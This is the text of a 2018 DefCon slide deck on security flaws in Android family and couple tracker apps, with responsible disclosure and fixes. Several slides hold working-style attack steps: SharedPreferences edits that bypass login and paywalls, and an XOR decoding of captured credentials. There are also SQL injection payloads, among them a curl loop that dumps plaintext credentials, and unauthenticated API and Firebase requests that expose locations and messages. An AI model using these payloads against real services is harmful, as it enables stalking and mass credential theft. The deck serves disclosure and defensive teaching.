All your family secrets belong to us Worrisome security issues in tracker apps
Siegfried Rasthofer | Fraunhofer SIT, Germany Stephan Huber | Fraunhofer SIT, Germany DefCon26, August 11th 2018

Who are we?

Siegfried
§ Head of department Secure Software Engineering
§ PhD, M.Sc., B.Sc. in computer science § Static and dynamic code analysis § Founder of @TeamSIK and @CodeInspect

Stephan
§ Security researcher @Testlab Mobile Security
§ Code analysis tool development § IOT stuff § Founder of @TeamSIK

2

Who are we?

Siegfried
§ Head of department Secure Software Engineering
§ PhD, M.Sc., B.Sc. in computer science § Static and dynamic code analysis § Founder of @TeamSIK and @CodeInspect

Stephan
§ Security researcher @Testlab Mobile Security
§ Code analysis tool development § IOT stuff § Founder of @TeamSIK

(creds to: Alex, Daniel, Julien, Julius, Michael, Philipp, Steven, Kevin, Sebald, Ben)
3

Beer Announcement
4

Agenda
§ Motivation § Background Information § Client-Side Authorization § Client-Side and Communication Vulnerabilities § Server-Side Vulnerabilities § Responsible Disclosure Process § Summary
5

Agenda
§ Motivation § Background Information § Client-Side Authorization § Client-Side and Communication Vulnerabilities § Server-Side Vulnerabilities § Responsible Disclosure Process § Summary
6

Surveillance - Then
1960: Radio receiver inside pipe

1970: Microphone inside a dragonfly

1960: Camera inside a pack of cigarettes
7

* Source: http://www.businessinsider.com/

Surveillance - Now
Spyware/RAT
8

Surveillance - Now

Spyware/RAT

Benign Reasons?
9

Surveillance - Now

Benign Reasons?

Family

Couple

Friends
10

Good vs. Bad
Spyware/RAT

Family

Couple

Friends
11

Surveillance - Apps
Google Play Store
*Android Security Report 2017 12

How well is the collected data protected?
13

App Name
Couple Tracker App
My Family GPS Tracker KidControll GPS Tracker Rastrear Celular Por el Numero Phone Tracker By Number Couple Vow Real Time GPS Tracker Ilocatemobile
Family Locator (GPS) Free Cell Tracker Rastreador de Novia Phone Tracker Free Phone Tracker Pro Rastreador de Celular Avanzado
Rastreador de Novia Localiser un Portable avec son Numero
Handy Orten per Handynr
Track My Family

Google Play Store Installations 5-10 m
1-5m
100-500k
50-100k 10-50k
1k
14

App Name
Couple Tracker App
My Family GPS Tracker KidControll GPS Tracker Rastrear Celular Por el Numero Phone Tracker By Number Couple Vow Real Time GPS Tracker Ilocatemobile
Family Locator (GPS) Free Cell Tracker Rastreador de Novia Phone Tracker Free Phone Tracker Pro Rastreador de Celular Avanzado
Rastreador de Novia Localiser un Portable avec son Numero
Handy Orten per Handynr
Track My Family

Google Play Store Installations 5-10 m
1-5m
100-500k
50-100k 10-50k
1k
15

Takeaways
It is very easy to... § Enable premium features without paying § Access highly sensitive data of a person § Perform mass surveillance in real-time
16

Agenda
§ Motivation § Background Information § Client-Side Authorization § Client-Side and Communication Vulnerabilities § Server-Side Vulnerabilities § Responsible Disclosure Process § Summary
17

How does it work? ­ Very simple

pull

push

Observer

Tracking Provider (back-end/cloud)
18

Monitored Person

What kind of data?
pull Observer

TEXT
push Monitored Person
19

What kind of data?
pull Observer

TEXT
push Monitored Person
20

Attack Vectors

pull Observer
21

push Monitored Person

Attack Vectors

pull Observer
22

push Monitored Person

Attack Vectors

pull Observer
23

push Monitored Person

Agenda
§ Motivation § Background Information § Client-Side Authorization § Client-Side and Communication Vulnerabilities § Server-Side Vulnerabilities § Responsible Disclosure Process § Summary
24

101
1. Authentication Process 2. Authorization Process Observer
25

WTF?
1. Authentication Process Observer
26

WTF?
2. Client-Side Authorization 1. Authentication Process
Observer
27

WTF 1/4 ­ Enable Premium Features
28

WTF 1/4 ­ Enable Premium Features
boolean removeAd = SharedPref.getBoolean("l_ads", false) if(removeAd) {
this.setVisibility(View.GONE); } else {
... }
29

WTF 1/4 ­ Enable Premium Features
boolean removeAd = SharedPref.getBoolean("l_ads", false)
if(removeAd) { this.setVisibility(View.GONE);
} else { ...
}
/data/data/com.bettertomorrowapps.spyyourlovefree/ shared_prefs/loveMonitoring.xml
<boolean name="l_location_full" value="false" /> <boolean name="l_fb_full" value="false" /> <boolean name="l_loc" value="false" /> <boolean name="l_sms" value="false" /> <boolean name="l_ads" value="false" /> <boolean name="l_sms_full" value="false" /> <boolean name="l_call" value="false" /> <boolean name="l_fb" value="false" />
30

SharedPreferences Backup/Restore

§ Rooted device:
1. copy loveMonitoring.xml from app folder to pc 2. modify file, set false to true 3. copy back and overwrite orig. file with modified file
§ Unrooted device:

adb backup adb restore

adb tool

convert *

modify file

*https://github.com/nelenkov/android-backup-extractor
31

WTF 1/4 ­ Enable Premium Features
/data/data/com.bettertomorrowapps.spyyourlovefree/ shared_prefs/loveMonitoring.xml
<boolean name="l_location_full" value="false" /> <boolean name="l_fb_full" value="false" /> <boolean name="l_loc" value="false" /> <boolean name="l_sms" value="false" /> <boolean name="l_ads" value="false" /> <boolean name="l_sms_full" value="false" /> <boolean name="l_call" value="false" /> <boolean name="l_fb" value="false" />
32

WTF 1/4 ­ Enable Premium Features
/data/data/com.bettertomorrowapps.spyyourlovefree/ shared_prefs/loveMonitoring.xml
<boolean name="l_location_full" value="false" /> <boolean name="l_fb_full" value="false" /> <boolean name="l_loc" value="false" /> <boolean name="l_sms" value="false" /> <boolean name="l_ads" value="false" /> <boolean name="l_sms_full" value="false" /> <boolean name="l_call" value="false" /> <boolean name="l_fb" value="false" />
33

WTF 1/4 ­ Enable Premium Features
1. Give me all text messages Observer
34

WTF 1/4 ­ Enable Premium Features
1. Give me all text messages 2. Ok: msg1, msg2, msg3, ... Observer
35

WTF 1/4 ­ Enable Premium Features
3. Client "Authorization" Check
if(getBoolean("l_sms_full") == false) { String[] msgs = getAllMsgs(); ... singleMsg = msgs[i].substring(0, 50);
} else {
//return complete text messages }
1. Give me all text messages
2. Ok: msg1, msg2, msg3, ...
Observer
36

WTF 1/4 ­ Enable Premium Features
3. Client "Authorization" Check
if(getBoolean("l_sms_full") == false) { String[] msgs = getAllMsgs(); ... singleMsg = msgs[i].substring(0, 50);
} else {
//return complete text messages }
1. Give me all text messages
2. Ok: msg1, msg2, msg3, ...
Observer
37

WTF 2/4 ­ Admin Privileges
· App supports two modes: · parent (controller/administration) · children (monitored)
· Administrator can create new Administrators · Administrator can monitor all children
38

WTF 2/4 ­ Admin Privileges
· App supports two modes: · parent (controller/administration) · children (monitored)
· Administrator can create new Administrators · Administrator can monitor all children
????
39

WTF 2/4 ­ Admin Privileges
· App supports two modes: · parent (controller/administration) · children (monitored)
· Administrator can create new Administrators · Administrator can monitor all children
<boolean name="isLogin" value="true" /> <boolean name="isParent" value="true" />
40

WTF 3/4 - Remove Lockscreen
41

WTF 3/4 - Remove Lockscreen
§ After app start the lock screen asks for pin
????
42

Remove Lockscreen
§ After app start the lock screen asks for pin § To remove the lock screen, change SharedPreference value from true to
false
<boolean name="pflag" value="true" />
<boolean name="pflag" value="false" />
43

WTF 4/4 ­ Authentication Bypass
§ Same works with login, no password required
<boolean name="isLogin" value="false" /> <boolean name="isLogin" value="true" />
44

Do not use SharedPreferences for authorization checks!!
45

Agenda
§ Motivation § Background Information § Client-Side Authorization § Client-Side and Communication Vulnerabilities § Server-Side Vulnerabilities § Responsible Disclosure Process § Summary
46

Mitm Attack

DATA user/app

DATA
tracking provider (back-end/cloud)
47

Mitm Attack

DATA user/app

DATA
tracking provider (back-end/cloud)
48

Mitm Attack

DATA user/app

DATA
tracking provider (back-end/cloud)
49

Mitm Attack

DATA user/app

DATA
tracking provider (back-end/cloud)
50

Mitm + Bad Crypto + Obfuscation
??
51

Mitm + Bad Crypto + Obfuscation

user@example.com

??

secure123

52

Mitm + Bad Crypto + Obfuscation
http://s9.***********.com/login/?aaa...
GET /login/?aaa=Bi9srqo&nch=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A& tnd=CFF1CxQoaQcoLWoRaQ%3D%3D%0A HTTP/1.1
53

Mitm + Bad Crypto + Obfuscation

GET /login/?

1.

aaa=Bi9srqo& nch=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A&

tnd=CFF1CxQoaQcoLWoRaQ%3D%3D%0A

HTTP/1.1

user@example.com secure123

54

Mitm + Bad Crypto + Obfuscation

user@example.com secure123

GET /login/?

1.

aaa=Bi9srqo& nch=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A&

tnd=CFF1CxQoaQcoLWoRaQ%3D%3D%0A

HTTP/1.1

GET /login/? ssp=CFF1CxQoaQcoLWoRaQ%3D%3D%0A&
2. eml=4hBWVqJg4D&
mix=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A HTTP/1.1

55

Mitm + Bad Crypto + Obfuscation

user@example.com secure123

GET /login/?

1.

aaa=Bi9srqo& nch=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A&

tnd=CFF1CxQoaQcoLWoRaQ%3D%3D%0A

HTTP/1.1

GET /login/? ssp=CFF1CxQoaQcoLWoRaQ%3D%3D%0A&
2. eml=4hBWVqJg4D&
mix=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A HTTP/1.1

GET /login/?
psw=-ZI-WQe&
3. amr=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A&
rma=CFF1CxQoaQcoLWoRaQ%3D%3D%0A
HTTP/1.1

56

Mitm + Bad Crypto + Obfuscation

user@example.com secure123

GET /login/?

1.

aaa=Bi9srqo& nch=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A&

tnd=CFF1CxQoaQcoLWoRaQ%3D%3D%0A

HTTP/1.1

GET /login/? ssp=CFF1CxQoaQcoLWoRaQ%3D%3D%0A&
2. eml=4hBWVqJg4D&
mix=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A HTTP/1.1

GET /login/?
psw=-ZI-WQe&
3. amr=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A&
rma=CFF1CxQoaQcoLWoRaQ%3D%3D%0A
HTTP/1.1

GET /login/?
aaa=ZTZrO&
4. mag=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A&
df=CFF1CxQoaQcoLWoRaQ%3D%3D%0A&
data=5JFJzgYW_ HTTP/1.1

57

Mitm + Bad Crypto + Obfuscation

user@example.com secure123

GET /login/?

1.

aaa=Bi9srqo& nch=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A&

tnd=CFF1CxQoaQcoLWoRaQ%3D%3D%0A

HTTP/1.1

GET /login/? ssp=CFF1CxQoaQcoLWoRaQ%3D%3D%0A&
2. eml=4hBWVqJg4D&
mix=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A HTTP/1.1

GET /login/?
psw=-ZI-WQe&
3. amr=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A&
rma=CFF1CxQoaQcoLWoRaQ%3D%3D%0A
HTTP/1.1

GET /login/?
aaa=ZTZrO&
4. mag=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A&
df=CFF1CxQoaQcoLWoRaQ%3D%3D%0A&
data=5JFJzgYW_ HTTP/1.1

58

Mitm + Bad Crypto + Obfuscation

user@example.com secure123

GET /login/?

1.

aaa=Bi9srqo& nch=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A&

tnd=CFF1CxQoaQcoLWoRaQ%3D%3D%0A

HTTP/1.1

GET /login/? ssp=CFF1CxQoaQcoLWoRaQ%3D%3D%0A&
2. eml=4hBWVqJg4D&
mix=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A HTTP/1.1

GET /login/?
psw=-ZI-WQe&
3. amr=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A&
rma=CFF1CxQoaQcoLWoRaQ%3D%3D%0A
HTTP/1.1

GET /login/?
aaa=ZTZrO&
4. mag=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A&
df=CFF1CxQoaQcoLWoRaQ%3D%3D%0A&
data=5JFJzgYW_ HTTP/1.1

59

Mitm + Bad Crypto + Obfuscation
'k', 'c', '#', 'a', 'p', 'p', '#', 'k', 'e', 'y', '#'
60

Mitm + Bad Crypto + Obfuscation

@
user@example.com

'k', 'c', '#', 'a', 'p', 'p', '#', 'k', 'e', 'y', '#'

XOR

Base64 DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ==

61

Mitm + Bad Crypto + Obfuscation

@
user@example.com

'k', 'c', '#', 'a', 'p', 'p', '#', 'k', 'e', 'y', '#'

{nl, bhf, mag, bdt, qac, trn, amr, mix, nch}

XOR

Random() + "="

+

Base64

nch = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A mix = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A amr = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A mag = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A
62

Mitm + Bad Crypto + Obfuscation

@
user@example.com

'k', 'c', '#', 'a', 'p', 'p', '#', 'k', 'e', 'y', '#'

********
secure123

{nl, bhf, mag, bdt, qac, trn, amr, mix, nch}

XOR

Random() + "="

+

Base64

XOR
{df, ssp, fgh, drt, tnd, rfb, rma, vwe, hac}

Base64

+

"=" + Random()

nch = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A mix = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A amr = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A mag = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A
63

CFF1CxQoaQcoLWoRaQ%3D%3D%0A = tnd CFF1CxQoaQcoLWoRaQ%3D%3D%0A = ssp CFF1CxQoaQcoLWoRaQ%3D%3D%0A = rma CFF1CxQoaQcoLWoRaQ%3D%3D%0A = df

Mitm + Bad Crypto + Obfuscation

decode Base64 DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ==

decode Base64 CFF1CxQoaQcoLWoRaQ==

64

Mitm + Bad Crypto + Obfuscation

@
user@example.com

'k', 'c', '#', 'a', 'p', 'p', '#', 'k', 'e', 'y', '#'

XOR

XOR

********
secure123

decode Base64 DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ==

decode Base64 CFF1CxQoaQcoLWoRaQ==

65

Mitm + Bad Crypto + Obfuscation

GET /login/? aaa=Bi9srqo& nch=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A& tnd=CFF1CxQoaQcoLWoRaQ%3D%3D%0A data=5JFJzgYW_ HTTP/1.1

@
********

Random() + "="

+

GenerateRandomString()

{usr, psw, uid, data, eml, pss, foo, clmn, count, nam, srv, answ, aaa }

66

67

Correct Secure Communication
§ Use https via TLS 1.2 or TLS 1.3 § Valid server certificate
68

Correct Secure Communication

§ Use https via TLS 1.2 or TLS 1.3 § Valid server certificate § Implementation in Android:

Java:
URL url = new URL("https://wikipedia.org"); URLConnection urlConnection = url.openConnection();

Kotlin:
val url = URL("https://wikipedia.org") val urlConnection: URLConnection = url.openConnection()

https://dev eloper. android. com/training/articles/secu rity -ssl#jav a
69

"Authentication"
70

"Authentication"
... Message message = new Message(); try {
Class.forName("com.mysql.jdbc.Driver"); Connection con = DriverManager. getConnection(
); try { ...
71

"Authentication"
... Message message = new Message(); try {
Class.forName("com.mysql.jdbc.Driver"); Connection con = DriverManager. getConnection("jdbc:mysql://mysql.r*****************r.mobi/r*************06",
"r*************06", "t**********b"); try { ...
72

"Authentication"

... Message message = new Message(); try {
Class.forName("com.mysql.jdbc.Driver"); Connection con = DriverManager. getConnection("jdbc:mysql://mysql.r*****************r.mobi/r*************06",
"r*************06", "t**********b"); try { ...

database address

username

73

"Authentication"

... Message message = new Message(); try {
Class.forName("com.mysql.jdbc.Driver"); Connection con = DriverManager. getConnection("jdbc:mysql://mysql.r*****************r.mobi/r*************06",
"r*************06", "t**********b"); try { ...

database address

username

password

74

"Authentication"

§ MySQL Database with following table scheme:

Field

Type

Null

Key

Default

Extra

nome

varchar(50) NO

NULL

email

varchar(30) NO

NULL

latitude

varchar(30) NO

NULL

longitude varchar(30) NO

NULL

data

varchar(30) NO

NULL

hora

varchar(30) NO

NULL

codrenavam varchar(30) NO

NULL

placa

Varchar(30) NO

PRI

NULL

75

"Authentication"

... Message message = new Message(); try {
Class.forName("com.mysql.jdbc.Driver"); Connection con = DriverManager. getConnection("jdbc:mysql://mysql.r*****************r.mobi/r*************06",
"r*************06", "t**********b"); try { ...

database address

username

password

All in all we had access to over 860.000 location data of different users, distributed over the whole world.
76

Is that all ?
77

Prepared Statement? WTF!
... Message message = new Message(); try {
Class.forName("com.mysql.jdbc.Driver"); Connection con = DriverManager. getConnection("jdbc:mysql://mysql.r*****************r.mobi/r*************06",
"r*************06", "t**********b"); try {
PreparedStatement prest = con.prepareStatement("insert rastreadorpessoal values(?)");
78

Prepared Statement? WTF!
... Message message = new Message(); try {
Class.forName("com.mysql.jdbc.Driver"); Connection con = DriverManager. getConnection("jdbc:mysql://mysql.r*****************r.mobi/r*************06",
"r*************06", "t**********b"); try {
PreparedStatement prest = con.prepareStatement("insert rastreadorpessoal values(?)"); prest.executeUpdate("insert into rastreadorpessoal
values('" + this.atributos.getNome() + "', '" + this.atributos.getEmail() + "', '" + this.atributos.getLatitudeStr() + "', '" + this.atributos.getLongitudeStr() + "', '" + this.atributos.getDataBancoStr() + "', '" + this.atributos.getHoraBancoStr() + "', '" + this.atributos.getRenavam() + "', '" + this.atributos.getPlaca() + "')");
prest.close(); con.close(); ...
79

Prepared Statement? WTF!
... Message message = new Message(); try {
Class.forName("com.mysql.jdbc.Driver"); Connection con = DriverManager. getConnection("jdbc:mysql://mysql.r*****************r.mobi/r*************06",
"r*************06", "t**********b"); try {
PreparedStatement prest = con.prepareStatement("insert rastreadorpessoal values(?)"); prest.executeUpdate("insert into rastreadorpessoal
values('" + this.atributos.getNome() + "', '" + this.atributos.getEmail() + "', '" + this.atributos.getLatitudeStr() + "', '" + this.atributos.getLongitudeStr() + "', '" + this.atributos.getDataBancoStr() + "', '" + this.atributos.getHoraBancoStr() + "', '" + this.atributos.getRenavam() + "', '" + this.atributos.getPlaca() + "')");
prest.close(); con.close(); ...
80

Stupid !
81

Agenda
§ Motivation § Background Information § Client-Side Authorization § Client-Side and Communication Vulnerabilities § Server-Side Vulnerabilities § Responsible Disclosure Process § Summary
82

101
1. Authentication Process 2. Authorization Process Observer
83

WTF-States of Server-Side Vulnerabilties
84

"That`s a feature"
85

Not a Bug it`s a Feature
§ Web service provides public access to user tracks, allow all by default
86

Not a Bug it`s a Feature
§ Web service provides public access to user tracks, allow all by default
87

Not a Bug it`s a Feature
https://www.greenalp.com/realtimetracker/index.php?viewuser=USERNAME
88

Demo Time !
89

Is that all ?
90

Public Webinterface
91

Authentication ­ What?
92

Part1: Who Needs Authentication?
http://***********g.azurewebsites.net/trackapplochistory.aspx?userid=********&childid=2***** ***0&currentdate=07/12/2017
93

Part1: Who Needs Authentication?
nothing new
http://***********g.azurewebsites.net/trackapplochistory.aspx?userid=********&childid=2***** ***0&currentdate=07/12/2017
94

Part1: Who Needs Authentication?

nothing new

your user id

http://***********g.azurewebsites.net/trackapplochistory.aspx?userid=********&childid=2***** ***0&currentdate=07/12/2017

95

Part1: Who Needs Authentication?

nothing new

your user id

http://***********g.azurewebsites.net/trackapplochistory.aspx?userid=********&childid=2***** ***0&currentdate=07/12/2017
id of the person to track

96

Part1: Who Needs Authentication?

nothing new

your user id

http://***********g.azurewebsites.net/trackapplochistory.aspx?userid=********&childid=2***** ***0&currentdate=07/12/2017

requested date

id of the person to track

97

Part1: Who Needs Authentication?

attacker

Response for http://***********g.azurewebsites.net/...

07:47 PM*49.8715330929084,8.639047788304 07:52 PM*49.8731935027927,8.63498598738923 07:53 PM*49.871533247265,8.63904788614738 ...

tracker back-end

List of the complete track

98

Part1: Who Needs Authentication?
99

Part2: Who Needs Authentication?
§ Text message feature § How do we get the messages for a user?
100

Part2: Who Needs Authentication?
§ Text message feature § How do we get the messages for a user?

attacker

POST /***************/api/get_sms HTTP/1.1 {"cnt":"100","user_id":"123456"} result counter

101

tracker back-end

Part2: Who Needs Authentication?
§ Text message feature § There is no authentication!

attacker

List of text msg with:
· user_id · timestamp · content · phone number
102

tracker back-end

Part2: Who Needs Authentication?
§ What happens if user_id is empty?

attacker

POST /***************/api/get_sms HTTP/1.1 {"cnt":"100","user_id":""}

tracker back-end

103

Part2: Who Needs Authentication?
§ What happens if user_id is empty?

attacker

All messages of all users!
TEXT TEXT TEXT TEXT TEXT
104

tracker back-end

SQL ­ Very Simple
105

Back-end Attack to Track all User
back-end API extraction
http://*********/FindMyFriendB/fetch_family.php?mobile=<mobile number>
106

Back-end Attack to Track all User
back-end API extraction
http://*********/FindMyFriendB/fetch_family.php?mobile=<mobile number>
[{"to_username":"*****","to_mobile":"9********9","lat":"*0.2916455"," lon":"7*.0521764","time":"12:0,27-12-2016"}]
107

Simple SQL Injection
back-end API extraction
http://*********/FindMyFriendB/fetch_family.php?mobile=' or '' ='
108

Simple SQL Injection
back-end API extraction
http://*********/FindMyFriendB/fetch_family.php?mobile=' or '' ='
[{"to_username":"***","to_mobile":"9********4","lat":"2*.644490000000005","lon":"*8.35368","time":"18:55,04-122016"},{"to_username":"****","to_mobile":"9******9","lat":"*0.2916455","lon":"*8.0521764","time":"12:0,27-122016"},{"to_username":"****","to_mobile":"9********2","lat":"*3.8710253","lon":"*5.6093338","time":"18:6,19-112016"},{"to_username":"****","to_mobile":"9*******2","lat":"*6.5958902","lon":"-*7.3897167","time":"13:46,04-122016"},{"to_username":"****","to_mobile":"9*******0","lat":"*2.621241065689713","lon":"*8.33497756126259","time":"9:2 5,20-11-2016"},{"to_username":"****","to_mobile":"4********1","lat":"*1.8925267","lon":"-*1.3928747","time":"3:26,12022017"},{"to_username":"","to_mobile":"","lat":"","lon":"","time":""},{"to_username":"***","to_mobile":"9********8", "lat":"*5.262387837283313","lon":"*4.10851701162755","time":"23:47,20-112016"},{"to_username":"****","to_mobile":"9*******6","lat":"0","lon":"0","time":"12:35"},{"to_username":"***","to_mob ile":"8********5","lat":"*5.3401165","lon":"*5.1459643","time":"8:45,21-112016"},{"to_username":"****","to_mobile":"8********8","lat":"0","lon":"0","time":"0:32"},{"to_username":"****","to_mo bile":"9********2","lat":"*2.4393024","lon":"-*5.0414924","time":"23:0,20-112016"},{"to_username":"****","to_mobile":"9********8","lat":"*2.4386613","lon":"-*5.0398665","time":"7:14,21-112016"},{"to_username":"****","to_mobile":"8********6","lat":"*3.7005867","lon":"*6.9793598","time":"17:33,24-122016"},{"to_username":"****","to_mobile":"8********5","lat":"*2.584631","lon":"*8.2787425","time":"20:56,22-112016"},{"to_username":"*****","to_mobile":"8********1","lat":"*2.7993167","lon":"*6.2369126","time":"17:49,26-112016"},{"to_username":"****","to_mobile":"9*******5","lat":"*2.5846746","lon":"*8.2787492","time":"18:28,21-112016"},{"to_username":"***","to_mobile":"8*******7","lat":"*2.4069115","lon":"-*1.1435983",...
109

SQL - Simple
110

Accessing Images
§ Cloud storage for images
111

Accessing Images
§ Cloud storage for images § One cloud for all images
112

Accessing Images
§ Cloud storage for images § One cloud for all images § User authentication required § Filter corresponding images by user id
113

Accessing Images
§ Cloud storage for images § One cloud for all images § User authentication required § Filter corresponding images by user id § Bypass cloud authentication to get access to all images
114

Demo Time!
115

Get all User Credentials
§ App provides an API and a process for reinstallation of the app 1. App checks if user already has an account 2. Sends device id to the server
POST http://push001.***********/***********/v5/ Content-Type: application/json {"method":"getuserid","deviceid":"c1b86d87ed6f51011c0d53a654f16455"}
116

Get all User Credentials
§ App provides an API and a process for reinstallation of the app 1. App checks if user already has an account 2. Sends device id to the server 3. Server checks if id exists and responses with:
username, password and email
POST http://push001.***********/***********/v5/ Content-Type: application/json {"method":"getuserid","deviceid":"c1b86d87ed6f51011c0d53a654f16455"}
117

Attack Strategy
§ Spoofing the device id will deliver us credentials § BUT device id generation is relative complex and guessing is unlikely
118

Attack Strategy
§ Spoofing the device id will deliver us credentials § BUT device id generation is relative complex and guessing is unlikely § Empty id trick does not work L
POST http://push001.***********/***********/v5/ Content-Type: application/json {"method":"getuserid","deviceid":" "}
119

Attack Strategy
§ Spoofing the device id will deliver us credentials § BUT device id generation is relative complex and guessing is unlikely § Empty id trick does not work L § Let`s try SQL injection again J
POST http://push001.***********/***********/v5/ Content-Type: application/json {"method":"getuserid","deviceid":" ' or 1=1 limit 1 offset 5 -- "}
120

SQL-Injection

§ Curl Command:

curl -H "Content-Type: application/json" -X POST -d "{\"method\":\"getuserid\", \"deviceid\":\" ' or 1=1 limit 1 offset 5 -http://push001.***********/*********/v5/

\"}"

121

SQL-Injection

§ Curl Command:

curl -H "Content-Type: application/json" -X POST -d "{\"method\":\"getuserid\", \"deviceid\":\" ' or 1=1 limit 1 offset 5 -http://push001.***********/*********/v5/

\"}"

§ Result:
{"result":"success", "id":"yb*****","pass":"y********4","email":"y*****@hanmail.net"}

plaintext password
122

SQL-Injection

§ Curl Command:

iterate over the offset

curl -H "Content-Type: application/json" -X POST -d "{\"method\":\"getuserid\", \"deviceid\":\" ' or 1=1 limit 1 offset 6 -http://push001.***********/*********/v5/

\"}"

§ Result:
{"result":"success", "id":"se*****","pass":"qwe*******4","email":"se*****@gmail.com"}

plaintext password
123

SQL-Injection

§ Curl Command:

iterate over the offset

curl -H "Content-Type: application/json" -X POST -d "{\"method\":\"getuserid\", \"deviceid\":\" ' or 1=1 limit 1 offset 1700400 -http://push001.***********/*********/v5/

\"}"

> 1.700.000 plaintext credentials

124

WTF?
125

Firebase
https://firebase.google.com/ 126

Authentication Misconfiguration

attacker

POST /*******celltracker/api/login HTTP/1.1 {"user_email":"foo@bar.com"}
victim email
127

tracker back-end

Authentication Misconfiguration

attacker

user_email foo@bar.com user@email.com ...

user_id 149737514214639 145859345853234 ...

POST /*******celltracker/api/login HTTP/1.1 {"user_email":"foo@bar.com"}
victim email

FREE
tracker back-end

128

Authentication Misconfiguration

attacker

user_email foo@bar.com user@email.com ...

user_id 149737514214639 145859345853234 ...

HTTP/1.1 200 OK {"login_data":[{"user_id":"149737514214639",...}

FREE
tracker back-end

129

Authorisation Misconfiguration
https://*****************.firebaseio.com/Users/149737514214639
attacker
130

Authorisation Misconfiguration

Query in Users

Table Users

user_id

last_location ...

149737514214639 address = ... ...

145859345853234 address = ... ...

...

...

...

https://*****************.firebaseio.com/Users/149737514214639
attacker

FREE

131

Location without Authorisation

attacker

HTTP/1.1 200 OK
{ last_location={ address= Rheinstraße 75 64295 Darmstadt Germany date=13/06/2017 lat=49.8717048 long=8.6387116
... }
132

Faceplam Light
133

But there is More

attacker

HTTP/1.1 200 OK
{ ... user_email=foo@bar.com user_name=theuser user_password=123456 user_token=cQfgiDRWx9o:APA91bGTkU1N9F... user_type=1
.. }
134

But there is More

attacker

HTTP/1.1 200 OK
{ ... user_email=foo@bar.com user_name=theuser user_password=123456 user_token=cQfgiDRWx9o:APA91bGTkU1N9F... user_type=1
.. }
135

But there is More

HTTP/1.1 200 OK
{ ... user_email=foo@bar.com user_name=theuser user_password=123456 user_token=cQfgiDRWx9o:APA91bGTkU1N9F... user_type=1
.. }

public void onDataChange(DataSnapshot dataSnapshot) { PasswordActivity.this.util.log("userid password123", "" + dataSnapshot.getValue());
if(PasswordActivity.get_string_from_edittext(PasswordActivity.ed_password).compareToIgnoreCase( dataSnapshot.getValue().toString()) == 0) { .... PasswordActivity.this.save_user_data(); return;
}
PasswordActivity.lDialog.dismiss(); PasswordActivity.this.util.toast("Password Wrong"); }

136

Authorisation Misconfiguration
no user_id
https://*****************.firebaseio.com/Users/
attacker
137

Authorisation Misconfiguration

attacker

Table Users

user_id

last_location ...

149737514214639 address = ... ...

145859345853234 address = ... ...

...

...

...

FREE

138

Sh** happens
139

Problems?
§ Misconfiguration of Firebase, no authorization rules
*https://firebase.google.com/docs/auth/ 140

Problems?
§ Misconfiguration of Firebase, no authorization rules § User authentication is done on app (client) side, user authentication must be
done on server side
*https://firebase.google.com/docs/auth/ 141

Problems?
§ Misconfiguration of Firebase, no authorization rules § User authentication is done on app (client) side, user authentication must be
done on server side § Use Firebase SDK authentication (e.g. Google Sign-in, custom email -
password based, ...*)
*https://firebase.google.com/docs/auth/ 142

Problems?
§ Misconfiguration of Firebase, no authorization rules § User authentication is done on app (client) side, user authentication must be
done on server side § Use Firebase SDK authentication (e.g. Google Sign-in, custom email -
password based, ...*) § Custom authentication back-end possible (based on signed tokens, details
see**)
*https://firebase.google.com/docs/auth/ **https://firebase.google.com/docs/auth/android/custom-auth 143

Agenda
§ Motivation § Background Information § Client-Side Authorization § Client-Side and Communication Vulnerabilities § Server-Side Vulnerabilities § Responsible Disclosure Process § Summary
144

Responsible Disclosure
§ Informed vendors, 90 days to fix the bugs § Reactions:
§ A few: "We will fix it" § No reaction § "How much money do you want" § "It's not a bug, it's a feature"
§ Announced to Google Android Security and to ASI (app security improvement)Team -> no direct reaction
§ Some apps removed from Google Play Store (12 of 19) § Still vulnerable back-ends and apps in the store § Some apps are detected as malware now
145

Agenda
§ Motivation § Background Information § Client-Side Authorization § Client-Side and Communication Vulnerabilities § Server-Side Vulnerabilities § Responsible Disclosure Process § Summary
146

Summary
§ DON`T use plaintext communication in mobile!
147

Summary
§ DON`T use plaintext communication in mobile! § Use prepared statements (in correct way J) to avoid SQL injection
148

Summary
